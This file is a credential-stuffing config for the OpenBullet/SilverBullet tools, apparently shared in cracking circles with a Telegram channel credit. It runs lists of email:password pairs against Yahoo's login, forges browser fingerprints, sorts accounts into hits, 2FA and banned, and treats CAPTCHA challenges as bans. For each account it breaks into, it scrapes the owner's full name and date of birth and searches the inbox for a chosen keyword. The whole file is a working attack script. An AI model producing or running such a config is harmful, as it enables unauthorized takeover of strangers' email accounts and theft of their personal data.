@@ -1,0 +1,335 @@
+[SETTINGS]
+{
+  "Name": "Yahoo + Inbox Searcher",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2023-07-06T17:17:35.1514233-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@MRCOMBO1",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Keyword you want to search for?",
+      "VariableName": "target",
+      "Id": 22835941
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Yahoo + Inbox Searcher",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<USER>" DoesNotContain "@yahoo" 
+
+FUNCTION RandomNum "1" "6" -> VAR "plugins" 
+
+FUNCTION Hash MD5 "<plugins>" -> VAR "phash" 
+
+FUNCTION RandomNum "25" "40" -> VAR "fonts" 
+
+FUNCTION Hash MD5 "<fonts>" -> VAR "fhash" 
+
+FUNCTION RandomString "123.?d?d?d?d?d?d?d?d?d?d?d?d?d?d" -> VAR "audio" 
+
+SET VAR "one" "Google Inc. (NVIDIA)~ANGLE (NVIDIA, NVIDIA GeForce GT 730 Direct3D11 vs_5_0 ps_5_0, D3D11-23.21.13.8813)"
+SET VAR "two" "ANGLE (AMD Radeon(TM) R3 Graphics Direct3D11 vs_5_0 ps_5_0),desktop,78,39,0,0.00"
+SET VAR "three" "ANGLE (NVIDIA GeForce GTX 760 (192-bit) Direct3D11 vs_5_0 ps_5_0),desktop,90,39,0,0.00"
+SET VAR "four" "ANGLE (AMD Radeon(TM) R6 Graphics Direct3D11 vs_5_0 ps_5_0),desktop,87,38,0,0.0"
+SET VAR "five" "ANGLE (ATI Mobility Radeon HD 3430 (Microsoft Corporation WDDM 1.1) Direct3D9Ex vs_3_0 ps_3_0),desktop,14,2,0,0.00"
+SET VAR "six" "ANGLE (NVIDIA GeForce Go 7950 GTX Direct3D9Ex vs_3_0 ps_3_0),desktop,3,2,0,0.00"
+SET VAR "seven" "ANGLE (NVIDIA GeForce GT 220M Direct3D11 vs_4_0 ps_4_0),desktop,3,2,0,0.00"
+SET VAR "eight" "ANGLE (NVIDIA GeForce GT 320M Direct3D9Ex vs_3_0 ps_3_0),desktop,4,2,0,0.00"
+SET VAR "nine" "ANGLE (NVIDIA GeForce GT 330 Direct3D11 vs_4_0 ps_4_0),desktop,3,2,0,0.00"
+SET VAR "ten" "ANGLE (NVIDIA GeForce GT 335M Direct3D11 vs_4_1 ps_4_1),desktop,3,2,0,0.00"
+SET VAR "eleven" "ANGLE (NVIDIA GeForce GT 420 Direct3D9Ex vs_3_0 ps_3_0),desktop,3,2,0,0.00"
+SET VAR "twelve" "ANGLE (NVIDIA GeForce GT 530 Direct3D9Ex vs_3_0 ps_3_0),desktop,2,2,0,0.00"
+SET VAR "thirteen" "ANGLE (NVIDIA GeForce GT 540M Direct3D9Ex vs_3_0 ps_3_0),desktop,9,2,0,0.00"
+SET VAR "fourteen" "ANGLE (NVIDIA GeForce GT 620M Direct3D11 vs_5_0 ps_5_0),desktop,7,2,0,0.00"
+SET VAR "fifteen" "ANGLE (NVIDIA GeForce GTX 960M Direct3D9Ex vs_3_0 ps_3_0),desktop,6,2,0,0.00"
+SET VAR "sixteen" "ANGLE (NVIDIA GeForce RTX 2060 Direct3D11 vs_5_0 ps_5_0),desktop,4,2,0,0.00"
+SET VAR "seventeen" "ANGLE (NVIDIA GeForce GTX 880M Direct3D11 vs_5_0 ps_5_0),desktop,8,2,0,0.00"
+SET VAR "eighteen" "ANGLE (NVIDIA GeForce GTX 860M Direct3D11 vs_5_0 ps_5_0),desktop,6,2,0,0.00"
+SET VAR "nineteen" "ANGLE (NVIDIA GeForce GTX 770 Direct3D9Ex vs_3_0 ps_3_0),desktop,4,2,0,0.00"
+SET VAR "twenty" "ANGLE (NVIDIA GeForce GTX 670MX Direct3D11 vs_5_0 ps_5_0),desktop,4,2,0,0.00"
+SET VAR "GPUs" "<one>|<two>|<three>|<four>|<five>|<six>|<seven>|<eight>|<nine>|<ten>|<eleven>|<twelve>|<thirteen>|<fourteen>|<fifteen>|<sixteen>|<seventeen>|<eighteen>|<nineteen>|<twelve>"
+
+UTILITY Variable "GPUs" Split "|" -> VAR "GPU" 
+
+UTILITY List "GPU" Random -> VAR "gpufp" 
+
+REQUEST GET "https://login.yahoo.com/?src=iosphnx&appsrc=ymobilemail&client_id=bjlMDqGWQfvqFCpW&crumb=&lang=en-US&intl=us&theme=dark&redirect_uri=com.yahoo.aerogram%253A%252F%252Fphoenix%252Fcallback_auth&sdkDeviceId=NDZlNjZkNjkxODc3ZmEyODgwODljM2ZmNWZhOTc2MGYwMTU2MzMwZTI1&sdkDeviceSecret=eyJhbGciOiJub25lIn0.eyJ2IjoiMSIsImZzIjoidj0xJmQ9eVRzWmlsTUVPSndDcVZ3cHJQY1RreXhuY1F1ZHVRRFQxcWI1N1U4TzhtQ0EuSzlXNTRtTnI4eWpLUkxpbDBoSVNXLjhSRy4wZUpNV0twX09iamZVajR0TDFOSmQ2Nl94SGhjVWhCSjVfXzROenNiY0NPQWxqRnZVMEpvT3d6WTlZVkFtZzdxV1RqZnYuUVFJeVRTU3djQ1gyTEFzRlh1d1Z3Y2FRUXp6T25WUGQwc016SFQ1cEFuekhzS3lxSEI1Y0tWZEZJckI2QkI5azZQOFBqX2ZRbmMtfkEifQ.&pspid=1197791119&activity=default&appid=com.yahoo.Aerogram&appsrcv=6.17.2&srcv=6.13.0&prompt=login&.done=https%253A%252F%252Fapi.login.yahoo.com%252Foauth2%252Fauthorize%253F.scrumb%253D0%2526appid%253Dcom.yahoo.Aerogram%2526appsrcv%253D6.17.2%2526client_id%253DbjlMDqGWQfvqFCpW%2526code_challenge%253DnICnjGMTQ5vciwsACUP3UC5hnkG6IYiSGi60SIxLxZU%2526code_challenge_method%253DS256%2526intl%253Dus%2526language%253Den-US%25" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Origin: https://login.yahoo.com" 
+  HEADER "Referer: https://login.yahoo.com<location>" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1" 
+
+PARSE "<SOURCE>" LR "crumb\" value=\"" "\"" -> VAR "CR" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<CR>" EqualTo "" 
+
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"acrumb\" value=\"" "\" />" -> VAR "acrumb" 
+
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"sessionIndex\" value=\"" "\" />" -> VAR "session" 
+
+BEGIN SCRIPT JavaScript
+var unix = new Date().getTime();
+END SCRIPT -> VARS "unix"
+
+REQUEST POST "https://login.yahoo.com/?src=iosphnx&appsrc=ymobilemail&client_id=bjlMDqGWQfvqFCpW&crumb=&lang=en-US&intl=us&theme=dark&redirect_uri=com.yahoo.aerogram%253A%252F%252Fphoenix%252Fcallback_auth&sdkDeviceId=NDZlNjZkNjkxODc3ZmEyODgwODljM2ZmNWZhOTc2MGYwMTU2MzMwZTI1&sdkDeviceSecret=eyJhbGciOiJub25lIn0.eyJ2IjoiMSIsImZzIjoidj0xJmQ9eVRzWmlsTUVPSndDcVZ3cHJQY1RreXhuY1F1ZHVRRFQxcWI1N1U4TzhtQ0EuSzlXNTRtTnI4eWpLUkxpbDBoSVNXLjhSRy4wZUpNV0twX09iamZVajR0TDFOSmQ2Nl94SGhjVWhCSjVfXzROenNiY0NPQWxqRnZVMEpvT3d6WTlZVkFtZzdxV1RqZnYuUVFJeVRTU3djQ1gyTEFzRlh1d1Z3Y2FRUXp6T25WUGQwc016SFQ1cEFuekhzS3lxSEI1Y0tWZEZJckI2QkI5azZQOFBqX2ZRbmMtfkEifQ.&pspid=1197791119&activity=default&appid=com.yahoo.Aerogram&appsrcv=6.17.2&srcv=6.13.0&prompt=login&.done=https%253A%252F%252Fapi.login.yahoo.com%252Foauth2%252Fauthorize%253F.scrumb%253D0%2526appid%253Dcom.yahoo.Aerogram%2526appsrcv%253D6.17.2%2526client_id%253DbjlMDqGWQfvqFCpW%2526code_challenge%253DnICnjGMTQ5vciwsACUP3UC5hnkG6IYiSGi60SIxLxZU%2526code_challenge_method%253DS256%2526intl%253Dus%2526language%253Den-US%25" EncodeContent=TRUE 
+  CONTENT "browser-fp-data={\"language\":\"en-US\",\"colorDepth\":24,\"deviceMemory\":0.5,\"pixelRatio\":1,\"hardwareConcurrency\":4,\"timezoneOffset\":-120,\"timezone\":\"Europe/Bucharest\",\"sessionStorage\":1,\"localStorage\":1,\"indexedDb\":1,\"openDatabase\":1,\"cpuClass\":\"unknown\",\"platform\":\"Win32\",\"doNotTrack\":\"unknown\",\"plugins\":{\"count\":<plugins>,\"hash\":\"<phash>\"},\"canvas\":\"canvas winding:yes~canvas\",\"webgl\":1,\"webglVendorAndRenderer\":\"<gpufp>\",\"adBlock\":0,\"hasLiedLanguages\":0,\"hasLiedResolution\":0,\"hasLiedOs\":0,\"hasLiedBrowser\":0,\"touchSupport\":{\"points\":0,\"event\":0,\"start\":0},\"fonts\":{\"count\":<fonts>,\"hash\":\"<fhash>\"},\"audio\":\"<audio>\",\"resolution\":{\"w\":\"1920\",\"h\":\"1080\"},\"availableResolution\":{\"w\":\"1040\",\"h\":\"1920\"},\"ts\":{\"serve\":<unix>,\"render\":<unix>}}&crumb=<CR>&acrumb=<acrumb>&sessionIndex=<session>&displayName=&deviceCapability={\"pa\":{\"status\":false}}&username=<USER>&passwd=&signin=Next&persistent=y" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: keep-alive" 
+  HEADER "content-type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Origin: https://login.yahoo.com" 
+  HEADER "Referer: https://login.yahoo.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "messages.INVALID_USERNAME" 
+    KEY "Sorry, we don't recognize this email" 
+    KEY "/account/challenge/fail" 
+    KEY "Sorry, we don't recognize this account" 
+    KEY "error\\\":\\\"messages.ERROR_NOTFOUND" 
+    KEY "<SOURCE>" EqualTo "" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "yak-code" 
+    KEY "phone-obfuscation" 
+    KEY "/account/challenge/web-authn" 
+    KEY "/account/challenge/push" 
+  KEYCHAIN Ban OR 
+    KEY "account/challenge/recaptcha" 
+    KEY "location\":\"/account/challenge/arkose" 
+  KEYCHAIN Retry OR 
+    KEY "messages.INVALID_COOKIE" 
+  KEYCHAIN Custom "WAIT" OR 
+    KEY "/account/challenge/wait" 
+
+PARSE "<SOURCE>" JSON "location" -> VAR "location" 
+
+REQUEST GET "https://login.yahoo.com<location>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept: text/html,application/xhtmlxml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Connection: keep-alive" 
+
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"crumb\" value=\"" "\"" -> VAR "CR" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<CR>" EqualTo "" 
+
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"acrumb\" value=\"" "\"" -> VAR "acrumb" 
+
+REQUEST POST "https://login.yahoo.com<location>" 
+  CONTENT "browser-fp-data={\"language\":\"en-US\",\"colorDepth\":24,\"deviceMemory\":0.5,\"pixelRatio\":1,\"hardwareConcurrency\":4,\"timezoneOffset\":-120,\"timezone\":\"Europe/Bucharest\",\"sessionStorage\":1,\"localStorage\":1,\"indexedDb\":1,\"openDatabase\":1,\"cpuClass\":\"unknown\",\"platform\":\"Win32\",\"doNotTrack\":\"unknown\",\"plugins\":{\"count\":<plugins>,\"hash\":\"<phash>\"},\"canvas\":\"canvas winding:yes~canvas\",\"webgl\":1,\"webglVendorAndRenderer\":\"<gpufp>\",\"adBlock\":0,\"hasLiedLanguages\":0,\"hasLiedResolution\":0,\"hasLiedOs\":0,\"hasLiedBrowser\":0,\"touchSupport\":{\"points\":0,\"event\":0,\"start\":0},\"fonts\":{\"count\":<fonts>,\"hash\":\"<fhash>\"},\"audio\":\"<audio>\",\"resolution\":{\"w\":\"1920\",\"h\":\"1080\"},\"availableResolution\":{\"w\":\"1040\",\"h\":\"1920\"},\"ts\":{\"serve\":<unix>,\"render\":<unix>}}&crumb=<CR>&acrumb=<acrumb>&sessionIndex=<session>&displayName=<USER>&username=<USER>&passwordContext=normal&isShowButtonClicked=&showButtonStatus=&prefersReducedMotion=true&password=<PASS>&verifyPassword=Next" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Origin: https://login.yahoo.com" 
+  HEADER "Referer: https://login.yahoo.com<location>" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "Sign out all" 
+    KEY "Sign out " 
+    KEY "Upgrade to Yahoo Mail Pro!" 
+    KEY "Manage accounts" 
+    KEY "Add a recovery method to make sure you always have access to your account" 
+    KEY "href=\"/account/comm-channel/add?" 
+    KEY "=\"[state.mailCount]\"></" 
+    KEY "Manage Accounts" 
+    KEY "<ADDRESS>" Contains "yahoo.com/?guccounter" 
+    KEY "<p>Found. Redirecting to <a href=\\\"https://mail" 
+    KEY "<ADDRESS>" Contains "https://maktoob.yahoo.com" 
+    KEY "<ADDRESS>" Contains "https://mail.yahoo.com/" 
+    KEY "<ADDRESS>" Contains "https://login.yahoo.com/account/comm-channel/refresh" 
+    KEY "Don&#x27;t lose access to your account" 
+    KEY "Do not block yourself from logging in" 
+    KEY "Don't lose access to your account" 
+    KEY "<ADDRESS>" Contains "https://login.yahoo.com/account/update" 
+    KEY "<ADDRESS>" Contains "https://login.yahoo.com/account/fb-messenger-linking" 
+    KEY "Use Messenger to recover your account" 
+    KEY "Make sure your account is secure" 
+    KEY "Manage Accounts" 
+    KEY "/account/comm-channel/refresh" 
+    KEY "https://guce.yahoo.com" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid password. Please try again" 
+    KEY "<p>Found. Redirecting to <a href=\"/account/challenge/password" 
+    KEY "Invalid password." 
+    KEY "/account/challenge/password" 
+    KEY "<ADDRESS>" Contains "https://login.yahoo.com/account/challenge/password" 
+  KEYCHAIN Custom "FALSE 2FA" OR 
+    KEY "Help us to keep your account safe" 
+    KEY "Account Key icon" 
+    KEY "For your safety, choose a method below to verify that" 
+    KEY "challenge-selector" 
+    KEY "<ADDRESS>" Contains "https://login.yahoo.com/account/challenge/challenge-selector?" 
+    KEY "Help us to keep your account safe." 
+    KEY "We&#x27;ve noticed some unusual account activity." 
+    KEY "For your safety, choose a method below to verify that it&#x27;s really you signing in to this account." 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "challenge/phone-obfuscation" 
+    KEY "challenge/phone-verify" 
+    KEY "challenge/email-verify" 
+    KEY "If you have access to this phone, please verify the missing digits" 
+    KEY "Enter verification code" 
+  KEYCHAIN Ban OR 
+    KEY "<ADDRESS>" Contains "https://login.yahoo.com/account/challenge/recaptcha" 
+    KEY "rate limited" 
+    KEY "location\":\"/account/challenge/arkose" 
+  KEYCHAIN Retry OR 
+    KEY "Uh oh, looks as though something went wrong" 
+
+REQUEST GET "https://login.yahoo.com/account/personalinfo?src=ym&.done=https%3A%2F%2Fmail.yahoo.com%2F&pspid=159600017&activity=ybar-acctinfo" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Origin: https://login.yahoo.com" 
+  HEADER "Referer: https://login.yahoo.com<location>" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1" 
+
+PARSE "<SOURCE>" LR "<div class=\"txt\" id=\"txt-birthfield\">" "<" CreateEmpty=FALSE -> CAP "DOB" 
+
+PARSE "<SOURCE>" LR "first-name\">" "</div>" -> VAR "Fn" 
+
+PARSE "<SOURCE>" LR "last-name\">" "</div>" -> VAR "Ln" 
+
+FUNCTION Constant "<Fn> <Ln>" -> CAP "Full Name" 
+
+REQUEST GET "https://mail.yahoo.com/" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "mailWssid\":\"" "\"," -> VAR "a" 
+
+FUNCTION Unescape "<a>" -> VAR "sid" 
+
+REQUEST GET "https://mail.yahoo.com/psearch/v3/srp?&multipart=false&appid=YMailNorrin&wssid=<sid>&clientId=mailsearch&timeout=60000&mailboxemail=<USER>&mailboxtype=FREE&sortOrder=date_desc&brandId=&mimeType=&expand=MAIN&limit=500&ui=1&device=desktop&market=en-US&contentId=smtp%3A<target>&query=&order=time" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "status\":200" 
+
+FUNCTION CountOccurrences "\"subject\":\"" "<SOURCE>" -> VAR "count" 
+
+FUNCTION Compute "<count> / 2" -> VAR "count" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<count>" GreaterThan "0" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<count>" LessThanOrEqual "0" 
+
+FUNCTION Constant "Amount of Emails: <count> | Target Name: <target>" -> CAP "Inbox Searcher" 
+
+#By_BAKATOU FUNCTION Constant "t.me/legendofcracking" -> CAP "FOR MORE CONFIGS : " 
+
